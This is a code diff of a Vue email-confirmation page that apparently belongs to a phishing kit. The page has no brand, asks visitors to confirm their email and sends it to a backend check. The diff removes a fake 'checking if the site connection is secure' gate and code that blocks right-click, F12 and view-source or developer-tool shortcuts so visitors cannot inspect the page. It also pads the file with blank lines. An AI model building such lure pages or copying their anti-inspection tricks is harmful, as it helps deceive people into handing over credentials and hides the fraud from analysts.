@@ -1,24 +1,13 @@
 <template>
-  <div v-if="!captchaToken" class="gate-container">
-    <main>
-      <div class="instructions captcha-adjusted">
-        <p>Please stand by while we are checking if the site connection is secure.</p>
-        <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
-      </div>
-    </main>
-  </div>
-
-  <div v-else class="background">
+  <div class="background">
     <div class="toto-container">
       <div class="header">
         <div class="logo-text">
           <span class="success-check">⼈</span>
         </div>
       </div>
-
       <div class="content">
         <p><strong>Please confirm your email address to continue.</strong></p>
-
         <div class="form-wrapper">
           <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
           <input id="honeypot" v-model="honeypot" type="text" tabindex="-1" autocomplete="off" aria-hidden="true" class="visually-hidden" />
@@ -33,9 +22,6 @@
           </button>
         </div>
       </div>
-
-      <div class="divider"></div>
-
       <div class="footer-container">
         <p class="footer-text">
           © 2025 All rights reserved.
@@ -48,46 +34,12 @@
 </template>
 
 <script setup>
-import { ref, onMounted, nextTick } from 'vue'
+import { ref } from 'vue'
 
 const email = ref('')
 const honeypot = ref('')
 const error = ref('')
 const loading = ref(false)
-const captchaToken = ref(null)
-let turnstileRendered = false
-
-onMounted(async () => {
-  await nextTick()
-  document.addEventListener('contextmenu', e => e.preventDefault())
-  document.addEventListener('keydown', e => {
-    if (
-      e.key === 'F12' ||
-      (e.ctrlKey && ['u', 's', 'p'].includes(e.key.toLowerCase())) ||
-      (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase()))
-    ) {
-      e.preventDefault()
-    }
-  })
-
-  if (window.turnstile && !turnstileRendered) {
-    window.turnstile.render('.cf-turnstile', {
-      sitekey: '0x4AAAAAABgei6QZruCN7n08',
-      callback: token => {
-        captchaToken.value = token
-        setTimeout(() => {
-          captchaToken.value = null
-          turnstileRendered = false
-          window.turnstile.render('.cf-turnstile', {
-            sitekey: '0x4AAAAAABgei6QZruCN7n08',
-            callback: t => captchaToken.value = t
-          })
-        }, 120000)
-      }
-    })
-    turnstileRendered = true
-  }
-})
 
 function isValidEmail(email) {
   return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
@@ -104,12 +56,11 @@ async function submitForm() {
 
   loading.value = true
   try {
-    const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
+    const res = await fetch(`/api/check-email`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         email: email.value,
-        captchaToken: captchaToken.value,
         middleName: honeypot.value
       })
     })
@@ -126,6 +77,22 @@ async function submitForm() {
   }
 }
 </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 <style scoped>
 .visually-hidden {
